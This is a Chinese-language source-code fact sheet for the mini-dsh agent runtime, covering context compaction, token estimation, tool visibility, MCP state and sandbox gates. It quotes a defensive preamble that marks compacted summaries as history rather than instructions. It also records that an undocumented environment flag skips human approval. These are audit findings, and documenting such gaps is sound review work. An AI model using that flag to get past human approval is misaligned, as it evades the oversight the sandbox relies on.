# mini-dsh 上下文管理 / 工具可见性 / MCP / Sandbox 源码事实清单

> 任务：task-2。结论以源码为准，`test/...:line` 只用于交叉验证行为。
> 证据格式：`仓库相对路径:行号`。标注「未验证」表示未在真实 Provider / 真实 MCP 远端 / OS 隔离层确认。
> 源码基线：当前工作区 `src/`（Node v25 本地跑过相关单测，未改源码）。

## 0. 一页速览

1. `ContextManager` 把 Durable Event Log 投影成模型消息；`project()` 纯投影，`prepare()` 是唯一会追加 `context/compaction` 的持久化边界（`src/core/context-manager.js:31`、`:54`、`:63`）。
2. Hard limit = `maxContextTokens - reservedOutputTokens`；soft limit = `availableInputTokens * compactAtRatio`；`maxContextTokens=null` 时整体 `disabled`，永不压缩（`src/core/context-policy.js:54`、`:63`、`:64`、`:56`）。
3. `reservedOutputTokens` 只是本地输入预算预留，不会变成 Provider 的 `max_tokens`（`src/core/context-policy.js:63`；DeepSeek 请求体里没有 `max_tokens`，`src/models/deepseek.js:26`）。
4. `TokenMeter` 的 `heuristic-v1` = 各部分的稳定 JSON / 字符串 UTF-8 字节数除以 3 向上取整；`model` 参数被忽略，永远 `exact=false`（`src/core/token-meter.js:1`、`:9`、`:11`、`:22`）。
5. 压缩只追加事件，不删原始事件；`shadowedThroughSeq` 之前的原始事件只是投影时被跳过，仍可重建 / 审计（`src/core/context-manager.js:63`、`src/core/context-projector.js:24`、`:27`）。
6. Planner 只接受 tool call / result 全闭合的安全边界，并始终保留最新一条原始 model-context 事件；压不到目标时只在能减少估算输入的前提下取最好候选，否则不压缩（`src/core/context-projector.js:78`、`:88`、`:98`、`src/core/context-compaction-planner.js:35`、`:88`、`:91`）。
7. 工具可见性三模式：All 全量；Deterministic 小 catalog 全量、大 catalog 词法 Top-K + pinned + 无匹配回退；Progressive = 基础选择（无匹配只留 pinned）+ `tool_search` + 当前 Run 激活集（`src/core/tool-visibility.js:1`、`src/core/deterministic-tool-visibility.js:21`、`src/core/progressive-tool-visibility.js:14`）。
8. 可见性不等于授权：LLM 只收到 `view(visibleNames).schemas()`，但执行走完整 `tools.execute(call.name, ...)`，不检查该名字是否可见（`src/core/agent-loop-runtime.js:127`、`:137`、`:264`；测试证据 `test/tool-visibility.test.js:44`、`:56`、`:138`）。
9. `tool_search` 只在 Progressive 模式注册；它搜索的是执行时已注册的完整 catalog，只激活、不负责连接 MCP，因此不存在懒加载连接 MCP（`src/index.js:44`、`src/tools/tool-search.js:37`、`:42`、`:43`）。
10. MCP 状态机只描述本地 Plugin Fiber：`DISCONNECTED / CONNECTING / ACTIVE / FAILED`；`ACTIVE` 不会做远端健康探测（`src/core/mcp-manager.js:1`、`:154`、`:167`）。
11. 每个 MCP server 的 connect / disconnect / reload 由 per-record Promise 尾链串行；不同 server 并发独立（`src/core/mcp-manager.js:138`、`:69`、`:83`）。
12. Sandbox 是应用层三闸门：路径 gate（词法 + realpath 二次包含性检查，最强）、命令启发式 / denylist（不完整）、人工批准（`[Y/n]`，真正的权限边界）（`src/core/sandbox-runtime.js:45`、`src/utils/path.js:58`、`src/core/sandbox-runtime.js:116`、`src/plugins/cli.js:308`）。
13. 文档 / 实现的主要不完全一致：Progressive 无匹配只留 pinned 对小 catalog 不成立（小 catalog 直接全量）；pinned（`alwaysVisible`）在生产入口从未配置；`MINI_DSH_AUTO_APPROVE=1` 可绕过人工批准但文档 / `.env.example` 未列；`allowHosts` 无法从插件配置注入；3 bytes/token 的保守估算未经 Provider tokenizer 验证。

---

## 1. ContextManager：project() 与 prepare() 的职责边界

### 1.1 构造与依赖
- `ContextManager` 必需 `sessions.get()` 与 `tokenMeter.estimateRequest()`；默认 `policy = normalizeContextPolicy({})`、默认 `DeterministicContextCompactor`、默认 `ContextCompactionPlanner`（`src/core/context-manager.js:12`–`:29`）。
- 依赖是注入的：`tokenMeter`、`compactor`、`planner` 都可替换；`AgentLoopRuntime` 也允许注入 `tokenMeter`、`contextPolicy`（`src/core/agent-loop-runtime.js:28`、`:45`、`:46`）。生产入口目前没有注入自定义 `tokenMeter`（`src/plugins/agent-loop.js:26`；`src/index.js:51` 只传了 `contextPolicy`、`toolCatalog`、`toolVisibility` 等）。
- `index.js` 用 `contextPolicyFromEnv()` 读取窗口配置（`src/index.js:53`）。

### 1.2 project()：纯投影 + 度量
`project(sessionId, context)` 做四件事（`src/core/context-manager.js:31`–`:52`）：
1. 从 Session 取完整事件数组：`this.sessions.get(sessionId).events`（`:32`）。
2. 调 `projectSessionEvents(events)` 得到模型消息（`:33`）。
3. 查最近一条有效压缩：`findLatestValidCompaction(events)`（`:34`）。
4. 用当前 `system`、`messages`、`tools` 估算 token，并算 pressure，返回 `{ messages, metadata }`（`:35`–`:51`）。

metadata 字段：`sourceEventCount`、`projectedMessageCount`、`tokenEstimate`、`pressure`、`compacted`、`compaction`（`:43`–`:49`）。其中 `compaction` 只暴露 `eventSeq / shadowedFromSeq / shadowedThroughSeq / strategy / beforeTokens / afterTokens`（`:68`–`:78`）。

**“纯”的含义**：`project()` 不 append、不修改事件；测试断言两次 `project` 结果深相等且事件 JSON 不变（`test/context-compaction.test.js:92`–`:104`），并断言 AgentLoop 不会回退到 legacy `deriveMessages`（`test/context-manager.test.js:157`–`:224`）。

### 1.3 prepare()：显式持久化边界
`prepare()` 先 `project()`，只有 pressure 为 `soft_limit` 或 `hard_limit` 才尝试规划，否则原样返回（`src/core/context-manager.js:54`–`:57`）。
- 调 `planner.plan({ events, projection, context })`；`plan` 为 `null` 就直接返回（`:60`、`:61`）。
- 有 plan 才执行 `sessions.append(sessionId, 'context/compaction', plan.data)`，然后重新 `project()` 返回新投影（`:63`、`:64`）。
- 因此是清晰的读写边界：`project` 纯读，`prepare` 写压缩事件。测试验证 `prepare()` 前事件快照不变、只追加一个 `context/compaction`（`test/context-compaction.test.js:40`–`:78`）。

### 1.4 hard / soft / reservedOutputTokens / 无 window 行为
`normalizeContextPolicy()`（`src/core/context-policy.js:7`–`:47`）：
- 默认值：`maxContextTokens=null`、`reservedOutputTokens=0`、`compactAtRatio=0.8`（`:1`–`:5`）。
- `maxContextTokens` 只能是 `null` 或正整数；`reservedOutputTokens` 非负整数且必须小于 `maxContextTokens`；`compactAtRatio` 在 `(0,1]` 内（`:23`–`:45`）。

`measureContextPressure(tokens, policy)`（`:49`–`:77`）：
- `maxContextTokens === null` 返回 `{state:'disabled', maxContextTokens:null, availableInputTokens:null, softLimitTokens:null}`（`:54`–`:60`）。
- `availableInputTokens = maxContextTokens - reservedOutputTokens`（`:63`）。
- `softLimitTokens = availableInputTokens * compactAtRatio`（可为小数，`:64`）。
- 判定：`tokens >= availableInputTokens` 为 `hard_limit`；否则 `tokens >= softLimitTokens` 为 `soft_limit`；否则 `normal`（`:65`–`:70`）。测试覆盖 59/60/70/80 的边界（`test/context-policy.test.js:28`–`:46`）。

`reservedOutputTokens` 的语义（关键考点）：
- 它只从输入预算里扣掉，用来防止“输入 + 即将生成的输出”超出窗口；不是请求参数。
- DeepSeek 请求体只构造 `model / messages / stream / thinking / stream_options / tools`，没有 `max_tokens`（`src/models/deepseek.js:26`–`:35`）。因此预留不等于限制模型最大输出。
- 只有环境变量路径 `contextPolicyFromEnv()` 在启用窗口且未显式指定时默认给 `4096`（`src/core/context-policy-config.js:3`、`:13`–`:18`）；直接 `new ContextManager` 且 policy 只给 `maxContextTokens` 时 reserved 仍是 0（`src/core/context-policy.js:3`）。测试确认前者：`test/context-policy-config.test.js:56`–`:66`。

无 window 时：
- `project()` 照常做 token 估算，但 pressure 为 `disabled`（`src/core/context-manager.js:47`；`test/context-manager.test.js:41`–`:46`）。
- `prepare()` 因为 state 不是 soft/hard，直接返回投影，不追加任何事件（`src/core/context-manager.js:57`；`test/context-compaction.test.js:23`–`:38`）。
- 生产默认 `MINI_DSH_MAX_CONTEXT_TOKENS` 为空，得到 `maxContextTokens=null`（`src/core/context-policy-config.js:31`–`:35`；`.env.example:25`）。

### 1.5 与 AgentLoop 的协作
- 每个 Step 先取 fresh `ToolCatalog` snapshot、选可见工具、生成 schemas，再把 `system / tools / messages` 交给 `contextManager.prepare()`（`src/core/agent-loop-runtime.js:127`–`:146`）。
- `prepare()` 后 `controller.recordContextPressure()`：若仍是 `hard_limit`，返回 `context_overflow` 停止，**不发这次 LLM 请求**（`src/core/agent-loop-runtime.js:147`–`:159`；`src/core/run-controller.js:134`–`:142`）。
- 测试：无 safe boundary 时 LLM 调用次数为 0、`stopReason=context_overflow`、无压缩事件；压缩后仍 hard 时“先追加压缩，再停止不发请求”（`test/context-compaction.test.js:483`–`:552`）。

### 1.6 边界与未验证
- 已确认：`reservedOutputTokens` 不会传给 Provider；全仓没有任何地方把它转成 `max_tokens`（`grep reservedOutputTokens src` 只出现在 `context-policy*`）。
- 未验证：真实 DeepSeek API 是否接受“第一条消息就是 assistant 的压缩摘要”这一消息序列（本地 mock 通过：`test/context-compaction.test.js:359`–`:429`）。
- 未验证：`prepare()` 不是原子操作；同 session 并发 append 是否竞态，只由上层 `SessionRunCoordinator` 串行化保证（`src/core/agent-loop-runtime.js:59`）。本报告未构造并发反例。
---

## 2. TokenMeter：`heuristic-v1` 到底怎么算

### 2.1 精确算法
`TokenMeter.estimateRequest`（`src/core/token-meter.js:9`–`:15`）：
- `tokens = estimatePart(system) + estimatePart(messages) + estimatePart(tools)`；
- `exact = false`；
- `method = 'heuristic-v1'`。

`estimatePart`（`:18`–`:23`）：
- `undefined / null / ''` 返回 `0`；空数组返回 `0`（`:19`–`:20`）。
- 字符串直接量；其他值先 `JSON.stringify(stableValue(value))`（`:21`）。
- `text.length === 0` 返回 `0`，否则 `Math.ceil(Buffer.byteLength(text, 'utf8') / 3)`（`:22`）；常量 `BYTES_PER_TOKEN = 3`（`:1`）。
- `stableValue` 递归排序对象 key（数组保序），保证同样的对象不同 key 顺序估算一致（`:25`–`:33`）。
- `model` 参数在签名里被命名为 `_model`，完全不用（`:9`）。

### 2.2 为什么 `exact=false`
- 它是 provider-neutral 的上下文压力护栏，不是计费 / usage 事实；代码注释明确说“不精确、可后续替换为模型 tokenizer”（`src/core/token-meter.js:3`–`:7`）。
- 没有 tokenizer 依赖；`method` 固定为 `heuristic-v1`（`:13`）。
- 与 Provider 真实 tokenizer 的差异来源：
  - 固定 3 bytes/token 忽略子词切分、CJK、emoji、代码缩进 / 空白；
  - 不含 chat template 的角色 / 分隔符 / special tokens 开销，也不含请求级 overhead；
  - 工具 schema 的 JSON 序列化形态由本仓代码决定，Provider 可能再包一层。
- 影响：
  - 低估 → 覆盖判断偏乐观，可能把超出真实窗口的请求发出去，被 Provider 拒绝；
  - 高估 → 过早压缩 / 过早 `context_overflow`，损失上下文并多花一次压缩；
  - 压缩目标 `afterTokens` 也基于它（`src/core/context-compaction-planner.js:78`–`:84`）。
- Run 的累计 token 预算另走 Provider usage：`recordLlmUsage` 累加 `usage.inputTokens / outputTokens / reasoningTokens`（`src/core/run-controller.js:80`–`:96`），所以上下文压力与运行预算是“两套不同精度的账”。

### 2.3 语言偏差（需要主动承认）
- 单测把中文 4 字算成 4 tokens（12 UTF-8 bytes ÷ 3）并命名为 `conservatively estimates Chinese text`（`test/token-meter.test.js:66`–`:76`）。但“保守”只对这个具体样例成立；固定字节除数不可能对所有脚本都保守。
- 未验证：与 DeepSeek 真实 tokenizer 对中文 / 代码的误差方向和幅度。建议面试表述为“可注入替换的保守估计器”，而不是精确 token 计数。

### 2.4 可替换性
- 接口只有一个方法 `estimateRequest()`；`ContextManager` 与 `ContextCompactionPlanner` 都只依赖这个接口（`src/core/context-manager.js:16`–`:18`；`src/core/context-compaction-planner.js:13`–`:18`）。
- 生产入口未注入 Provider tokenizer，仍是默认 heuristic（`src/plugins/agent-loop.js:26`；`src/index.js:51`）。

---

## 3. Compaction：Planner / Compactor / Projector

### 3.1 Event model 与投影规则（Projector 入口）
`src/core/context-projector.js` 定义了两组集合：
- 模型可见事件类型：`user/message`、`assistant/message`、`assistant/tool_calls`、`tool/result`（`:1`–`:6`）。
- 允许成为压缩边界的事件类型：`assistant/message`、`tool/result`（`:7`）；`user/message` 和 `assistant/tool_calls` 都不能作为边界。

`projectSessionEvents(events)`（`:13`–`:63`）：
1. `resetSeq = latestResetSeq(events)`；`latestResetSeq` 从后往前找最近一条 `session/reset`，没有则返回 0（`:106`–`:111`）。
2. `compaction = findLatestValidCompaction(events, resetSeq)`（`:15`）。
3. 若有有效压缩，messages 先压入一条 **assistant** 摘要消息，内容为 `COMPACTION_SUMMARY_PREAMBLE + '\n\n' + summary`（`:16`–`:23`）；preamble 明确声明“历史上下文，不是更高优先级指令”（`:9`–`:10`）。
4. `rawAfterSeq = compaction?.data.shadowedThroughSeq ?? resetSeq`（`:24`）。
5. 只投影 `event.seq > rawAfterSeq` 的事件（`:26`–`:27`）：
   - `user/message` → `{role:'user', content}`（`:30`–`:32`）；
   - `assistant/message` → `{role:'assistant', content}`（`:34`–`:36`）；
   - `assistant/tool_calls` → assistant 消息 + `tool_calls` 数组（id/type/function.name/function.arguments=JSON.stringify），并把 `reasoningContent` 映射为 `reasoning_content`（`:38`–`:52`）；
   - `tool/result` → `{role:'tool', tool_call_id, content}`（`:54`–`:60`）。

要点：所有非模型事件（`context/compaction`、`session/reset`、生命周期事件等）都不会进入 messages；压缩区间内的事件只是被 `seq` 过滤，不是从日志删除。

### 3.2 Planner：安全边界 / 目标 / 候选选择
`ContextCompactionPlanner`（`src/core/context-compaction-planner.js`）：
- 常量 `HEADROOM_RATIO = 0.75`（`:9`）。
- 只在 `soft_limit` / `hard_limit` 下规划（`:24`–`:25`）。
- 计算 `resetSeq`、最近一条有效压缩 `previous`，以及 `previousThroughSeq = previous.shadowedThroughSeq ?? resetSeq`（`:27`–`:29`）。
- 找 `latestRaw`：`previousThroughSeq` 之后最后一条模型可见事件（`:30`–`:33`）；没有则返回 `null`。
- 取安全边界：`findProtocolSafeBoundaries({ afterSeq: previousThroughSeq, beforeSeq: latestRaw.seq, resetSeq })`（`:35`–`:39`）。两个边界语义：
  - `afterSeq` 是开区间左端（`event.seq > afterSeq`，`context-projector.js:86`、`:96`）；
  - `beforeSeq` 是开区间右端（`event.seq >= beforeSeq` 会被跳过，`context-projector.js:86`），所以 `latestRaw` 本身永远不被压掉。
- 没有安全边界就返回 `null`，即“宁可硬顶也不切协议”（`:40`）。
- 目标：`targetTokens = Math.floor(pressure.softLimitTokens * 0.75)`（`:42`），留出低于 soft limit 的余量。
- 按升序遍历每个安全边界（`:44`）：
  1. 取 `(previousThroughSeq, shadowedThroughSeq]` 区间事件（`:45`–`:47`）；
  2. 调 `compactor.compact({ events, previousSummary, context, targetTokens })`（`:48`–`:53`）；
  3. 找区间内第一条模型可见事件作为 `shadowedFromSeq`（`:54`–`:59`）；
  4. 组装 `context/compaction` 的 data：`shadowedFromSeq`、`shadowedThroughSeq`、`summary`、`strategy`、`model`、`previousCompactionSeq`、`runId`、`stepId`、`beforeTokens`（`:60`–`:71`）；
  5. 构造一个临时 `virtualEvent`（seq = 最后一条事件 seq + 1），把它拼进事件后做一次投影 + token 估算，得到 `afterTokens`（`:72`–`:84`）。
- 选择规则（`:87`–`:91`）：
  - 若某候选 `afterTokens <= targetTokens`，立刻返回第一个满足的候选（升序 → 尽量少压、保留更多原文）；
  - 否则记录 `afterTokens` 最小的候选；
  - 所有候选都不达 target 时，只有“确实比原始估算更小”才返回 best，否则返回 `null`。
- 因此两个安全底线：1）绝不切断 tool pair；2）绝不接受“压完更大”的方案。测试覆盖 `afterTokens < beforeTokens` 以及 target headroom（`test/context-compaction.test.js:40`–`:78`）。

### 3.3 安全边界算法（不能切断 tool call / result pair）
`findProtocolSafeBoundaries(events, { afterSeq, beforeSeq, resetSeq })`（`src/core/context-projector.js:78`–`:104`）：
- 维护 `openToolCalls` 集合（`:83`）。
- 扫描事件：`seq <= resetSeq` 或 `seq >= beforeSeq` 的事件直接跳过；但 `afterSeq` 之前、`resetSeq` 之后的事件仍会先更新 `openToolCalls`，边界记录条件再要求 `seq > afterSeq`（`:85`–`:92`）。
- `assistant/tool_calls`：把每个 `call.id` 加入 open（`:88`–`:90`）；
- `tool/result`：删除 `toolCallId`（`:91`–`:93`）；
- 只有事件类型属于 `{assistant/message, tool/result}`、`openToolCalls.size === 0`、且 `seq > afterSeq` 时，才记录为边界（`:95`–`:101`）。
- 效果：
  - 单个 tool call 只有在 result 之后才能压缩（测试 `test/context-compaction.test.js:141`–`:152`）；
  - 并行 / 多个结果必须全部闭合（测试 `:165`–`:183`）；
  - 普通对话只在 assistant 消息后成为边界（测试 `:154`–`:163`）；
  - recovered / synthetic `not_executed` 的 tool/result 也能闭合配对（测试 `:185`–`:205`）。
- 如果存在永远不闭合的 tool call，`openToolCalls` 一直非空，其后的边界全部被封死；session 恢复会给未闭合调用补 `outcome=unknown` 的 synthetic result（`src/core/session-runtime.js:133`–`:164`），否则只能由 hard limit 触发 `context_overflow`。
### 3.4 Compactor：`deterministic-v1` 摘要算法（到底摘要了什么）
`DeterministicContextCompactor.compact()`（`src/core/context-compactor.js`）：
- 常量：`STRATEGY='deterministic-v1'`、`BYTES_PER_TOKEN=3`、`MAX_SUMMARY_CHARS=4096`（`:1`–`:3`）。
- 摘要长度预算 `summaryCharacterBudget(targetTokens) = clamp(floor(targetTokens * 3 * 0.4), 256, 4096)`（`:63`–`:68`）。planner 传入的 target 是 `softLimitTokens * 0.75`（`src/core/context-compaction-planner.js:42`）。
- 按固定顺序、固定截断长度拼 section（`:10`–`:60`）：
  1. 标题行 `[Compacted session context: deterministic-v1]`（`:12`）；
  2. `Latest user goal`：区间内最后一条 `user/message`，截断 800 字符（`:13`–`:16`）；
  3. `Previous compacted context`：上一条有效摘要，截断 1200 字符（`:17`–`:19`）；
  4. `Recent assistant text`：最后 3 条 `assistant/message` 或带 content 的 `assistant/tool_calls`，每条截断 500 字符（`:21`–`:33`）；
  5. `Tool activity`：遍历区间内**所有** `assistant/tool_calls`（每 call 的 name + stable JSON arguments，截断 320）与 `tool/result`（name 或 toolCallId + content，截断 320，使用 `…[tool result truncated]` 标记），再 `slice(-8)` 只保留最后 8 行（`:35`–`:53`）。
- `fitSections()` 依次追加，section 太长时按剩余预算截断，预算耗尽则丢弃后续 section（`:70`–`:79`）；`truncate()` 有 marker 长度保护（`:81`–`:86`）；`stableJson()` 用排序 key，保证同样输入同一输出（`:88`–`:100`）。
- 返回 `{ summary, strategy, model: null }`（`:55`–`:59`）。

**它不是什么**：不是 LLM 摘要，不含时间戳 / 随机数，不做语义聚类，不读取 system prompt、工具 schema 或执行结果全文；必然有损。测试确认重复调用结果完全一致、保留目标 / 旧摘要 / assistant 文本 / 工具活动，并标记被截断的工具输出（`test/context-compaction.test.js:106`–`:139`）。

### 3.5 Projector：lineage 校验与重建
**找“最近有效压缩”**：`findLatestValidCompaction(events, resetSeq)` 从后往前扫，跳过 `seq <= resetSeq` 的事件，遇到 `type === 'context/compaction'` 就做校验，第一个有效直接返回（`src/core/context-projector.js:65`–`:76`）。用 `validity` Map 记忆化，避免重复校验（`:68`、`:118`–`:119`）。

**单条压缩的有效性** `isValidCompaction`（`:117`–`:161`）：
1. `data.summary` 必须是非空字符串（`:122`）。
2. `shadowedFromSeq`、`shadowedThroughSeq` 必须是整数（`:123`–`:125`）。
3. 覆盖区间必须合法：`shadowedFromSeq > resetSeq`、`shadowedThroughSeq >= shadowedFromSeq`、`shadowedThroughSeq < event.seq`（`:126`–`:132`）。
4. `shadowedThroughSeq` 必须是协议安全边界：重新调用 `findProtocolSafeBoundaries(events, { afterSeq: through-1, beforeSeq: through+1, resetSeq })` 并检查 `through` 在结果里（`:133`–`:138`）。这防止“持久化的压缩事件伪造/损坏，切断了 tool protocol”。
5. `previousCompactionSeq`：
   - `null`：要求该事件之前不存在任何有效压缩（`:141`–`:143`）；
   - 非 null：必须是整数，并且指向真实存在的一条 `context/compaction`，在 reset 之后、当前事件之前、自身有效，且必须是“当前事件之前最近的有效压缩”，同时 `shadowedFromSeq` 与父节点相同、`shadowedThroughSeq` 严格大于父节点（`:144`–`:157`）。因此 lineage 是**线性**的，不能从更早的有效节点 fork（测试 `test/context-compaction.test.js:259`–`:278`）。
6. 通过后写入 validity = true 并返回（`:159`–`:160`）。
- `latestValidCompactionBefore` 负责找父节点（`:163`–`:171`）。

**重建**：`projectSessionEvents` 用“最新有效压缩的 summary + `seq > shadowedThroughSeq` 的原始事件”重建消息（`:13`–`:63`）。关键点：投影只使用 `shadowedThroughSeq`；`shadowedFromSeq` 不参与过滤，只用于 lineage / metadata。这意味着 `shadowedFromSeq` 若被伪造成非“区间内第一条模型事件”，projection 本身不会错，但语义元数据会不准——这是一个**校验缺口**（源码未校验 from 与区间内第一条模型可见事件一致；planner 自己会正确设置，见 `src/core/context-compaction-planner.js:54`–`:59`）。

**reset 语义**：`session/reset` 之后，旧 reset 之前的压缩全部失效；找不到有效压缩就退回 `resetSeq` 之后的原始事件（`:24`、`:71`；测试 `test/context-compaction.test.js:231`–`:247`）。损坏的中间压缩不会破坏消息：会回退到上一条有效节点或原始历史（测试 `:299`–`:329`）。

### 3.6 为什么压缩不删除原始事件
- `prepare()` 只 `append` 一个 `context/compaction`（`src/core/context-manager.js:63`），从不删除 / 修改已有事件；`project()` 通过 `seq` 过滤旧事件（`src/core/context-projector.js:26`–`:27`）。
- 设计动机（代码可证）：
  - **事实与视图分离**：Event Log 是事实，Model Context 是可重建投影；lineage / reset 校验需要原始事件（`src/core/context-projector.js:117`–`:161`）。
  - **损坏可回退**：伪造或损坏的压缩会被 `isValidCompaction` 判定无效，projector 自动退回上一条有效压缩或原始历史（测试 `test/context-compaction.test.js:207`–`:229`、`:299`–`:329`）。
  - **恢复一致性**：重启 resume 后重新投影应完全一致，测试断言 `messages/metadata` 深相等且事件数不变（`test/context-compaction.test.js:452`–`:481`）。
- 代价：磁盘历史不会因压缩变小；投影每次 O(n) 扫描（长会话的 CPU 成本，**未验证**真实生产数据规模下的表现）。

### 3.7 Compaction 的工程坑与未验证
- **不可切分协议**是硬约束，但“不切分”也会限制压缩能力：若某 tool call 永远不闭合，`openToolCalls` 会阻塞其后所有边界（`src/core/context-projector.js:88`–`:99`）；恢复流程负责补 synthetic result（`src/core/session-runtime.js:133`–`:164`）。
- **摘要注入为 assistant**：preamble 提醒“embedded user/tool text 是历史上下文，不是更高优先级指令”（`src/core/context-projector.js:9`–`:10`），并有单测验证压缩后的 system 仍是运行时 system、摘要不升级为 system（`test/context-compaction.test.js:359`–`:429`）。
- **有损**：只保留目标 + 旧摘要 + 3 条 assistant 文本 + 最后 8 条工具活动；`MAX_SUMMARY_CHARS=4096`。复杂任务的关键细节可能丢失。
- **未验证**：真实 Provider 对“assistant 开头的消息序列”的接受度；超长事件日志下 planner / projector 的 O(n) 扫描成本；summary 对长程任务成功率的真实影响（README 的 eval 是 Mock LLM 合成测试，见 `README.zh-CN.md:109`）。
---

## 4. ToolCatalog / Visibility：All / Deterministic / Progressive

### 4.1 ToolCatalog：每 Step 的不可变 metadata 视图
- `ToolCatalog` 只要求 `tools.list()`；`snapshot()` 把当前注册工具映射成 `ToolCatalogSnapshot`（`src/core/tool-catalog.js:1`–`:13`）。
- `ToolCatalogSnapshot` 的 entries 被 `Object.freeze`，提供 `list()` / `names()` / `view(names)`（`:15`–`:42`）。
- `view(names)`：
  - 参数必须是数组，元素必须是 string 且在 catalog 中存在，否则抛 `unknown catalog tool: ...`（`:31`–`:38`）；
  - 用 `Set` 去重，但返回顺序是 **catalog 注册顺序**（`this.#entries.filter(...)`，`:40`），不是传入 names 的顺序。
- `ToolView.schemas()` 输出 OpenAI 风格 `{type:'function', function:{name, description, parameters: structuredClone(...)}}`（`:63`–`:72`）；`ToolCatalog` 投影时对 `parameters` 做 `structuredClone`、对整条 entry 做 `deepFreeze`，并补齐默认 metadata（`readOnly/idempotent/concurrencySafe/sideEffect/timeoutMs`，`:75`–`:91`）。
- AgentLoop 每个 Step 都重新 `snapshot()`，再调 visibility，再把选中的名字 `view(...).schemas()` 交给模型（`src/core/agent-loop-runtime.js:127`–`:137`）。因此动态注册 / 注销的工具在**下一 Step** 的 snapshot 中体现：测试断言第一步 catalog 是 `[tool-b, tool-a]`、注册 `tool-c` 后第二步变成 `[tool-b, tool-a, tool-c]`（`test/tool-visibility.test.js:126`–`:139`）。
- 传给 visibility 的 `input` 是本次 run 的原始用户输入；测试断言两步的 `request.input` 相同（`test/tool-visibility.test.js:122`–`:125`）。

### 4.2 词法排序（rankTools）：具体 tokenization 与打分
`rankTools(catalog, query, { minimumScore = 1 })`（`src/core/tool-ranking.js:3`–`:21`）：
- 校验 `catalog` 是数组、`minimumScore` 是非负有限数（`:4`–`:7`）。
- `queryTokens = tokenizeToolText(query)`；若为空数组直接返回 `[]`（`:9`–`:11`）。因此空 input / 纯中文 query → 没有词法命中。
- `tokenizeToolText`：`String(value ?? '').toLowerCase().match(/[a-z0-9]+/g)`，再用 `Set` 去重并保持首次出现顺序（`:23`–`:31`）。**只保留 ASCII 小写字母和数字**；中文、下划线、连字符都会切断 token（例如 `read_file` → `['read','file']`）。
- 打分 `scoreTool`（`:33`–`:46`）：
  - 工具名 token 序列 `join(' ')` 与 query 的 token 序列完全相等 → +100（`:39`）；
  - 每个 query token：
    - 在工具名里 → +10（`:41`）；
    - 在 description 的 token 集合里 → +3（`:42`）；
    - 在 `parameters` 的属性名 token 集合里 → +1（`:43`）。
- `propertyNames(schema)` 递归收集 `properties` 的 key，并递归进嵌套对象 / 数组（`:48`–`:64`）。注意它不会做 camelCase 拆分，所以 `readFile` 只是一个 token `readfile`，query `read file` 匹配不到名字 token。
- 排序：`score` 降序，同分用 **catalog 里的原始 index** 升序（`:19`–`:20`），因此确定性 tie-break。
- `minimumScore` 默认 1；即便传 0，也会被 `score > 0` 过滤掉零分工具（`:19`）。非法值抛错（`:5`–`:7`）。
- 测试覆盖：name 精确 token 命中优先（`test/deterministic-tool-visibility.test.js:29`–`:37`）、description 加分（`:39`–`:47`）、parameter 属性名加分（`:49`–`:57`）、同分保持注册顺序（`:59`–`:69`）、中文无命中（`:71`–`:84`）。

限制（面试主动讲）：
- 无 embedding / 同义词 / 跨语言语义；纯 ASCII 词法；query 与工具名 token 顺序必须一致才拿 100 分。
- 一个工具的参数 schema 越大，参数名命中机会越多；但只加 1 分，权重远低于工具名。
- 所有工具自带同一个 description 时，排序退化为注册顺序（测试 `:59`–`:69`）。

### 4.3 三模式选择算法
**All**（`src/core/tool-visibility.js:1`–`:5`）：`select` 直接 `catalog.map(tool => tool.name)`，返回全部。

**Deterministic**（`src/core/deterministic-tool-visibility.js`）：
- 构造参数：`maxVisibleTools`（默认 `DEFAULT_MAX_VISIBLE_TOOLS=12`）、`alwaysVisible`（默认 `[]`）、`minimumScore`（默认 1）、`noMatchFallback`（默认 `'all'`）；构造时冻结并校验（`:7`–`:19`、`:42`–`:68`）。
- `select({catalog, input})`（`:21`–`:40`）：
  1. `names = catalog.map(name)`；
  2. `catalog.length === 0` → `[]`；
  3. **若 `catalog.length <= maxVisibleTools` 直接返回全部 names**（`:25`）。这是关键短路：小 catalog 不做词法排序、不区分 fallback；
  4. `pinned = names ∩ alwaysVisible`（`:27`）；
  5. `scored = rankTools(catalog, input, {minimumScore})`（`:28`）；
  6. 无正分命中：`noMatchFallback==='all'` 返回全部 names，否则只返回 `pinned`（`:30`–`:32`）；
  7. 有命中：从 scored 中剔除 pinned，取前 `maxVisibleTools` 个，再在末尾拼接 pinned（`:34`–`:38`）。
- 结果长度语义：`<= maxVisibleTools + pinned.length`（若命中数不足 K 则更少）；小 catalog 可能直接超过 `maxVisibleTools`。

**Progressive**（`src/core/progressive-tool-visibility.js`）：
- 构造：`baseVisibility` + `activationStore` + `searchToolName='tool_search'`（`:1`–`:12`）。
- `select(request)`（`:14`–`:24`）：
  1. `currentNames` 取当前 catalog 名字集合；
  2. `selected = baseVisibility.select(request)`；
  3. 过滤掉已不在 catalog 的名字；
  4. 若 catalog 含 `tool_search`，强制加入（`:19`）；
  5. 加入 `activationStore.names(request.runId)` 中仍存在 catalog 的名字（`:20`–`:22`）；
  6. 用 `Set` 去重，顺序 = 基础选择 → tool_search → 激活集（`:23`）。
- `beginRun` 与 `endRun` 都会 `activationStore.clear(runId)`（`:26`–`:32`）；AgentLoop 在 run 开始 / 结束时调用，且失败 fail-open（`src/core/agent-loop-runtime.js:93`、`:416`）。

**生产 wiring**（`src/core/tool-visibility-config.js`）：
- 默认 `MINI_DSH_TOOL_ROUTING='all'`；`MINI_DSH_MAX_VISIBLE_TOOLS` 默认 12；`MINI_DSH_MAX_ACTIVATED_TOOLS` 默认 24（`:6`–`:21`、`.env.example:34`–`:37`）。
- `all` → `AllToolsVisibility`，`activationStore=null`（`:23`–`:25`）。
- `deterministic` → `DeterministicToolVisibility({maxVisibleTools, noMatchFallback:'all'})`，无 activation store（`:27`–`:36`）。
- `progressive` → 创建 `ToolActivationStore`；base 用 `noMatchFallback:'none'`；用 `ProgressiveToolVisibility` 包装（`:37`–`:47`）。
- 未知 mode 直接抛错（`:49`）。`index.js` 只有在 `activationStore` 存在（即 progressive）时才注册 `tool_search` 插件（`src/index.js:41`–`:46`）。

### 4.4 pinned / fallback / topK 的精确语义与坑
- **pinned（alwaysVisible）是额外槽位**：先取 Top-K 时先把 pinned 从 scored 中排除，最后再拼接；所以 pinned 不会挤掉普通 Top-K，结果可超过 `maxVisibleTools`（`src/core/deterministic-tool-visibility.js:34`–`:38`）。测试：`maxVisibleTools=1` + `alwaysVisible=['core_status']` → `['search_docs','core_status']`（`test/deterministic-tool-visibility.test.js:115`–`:131`）。
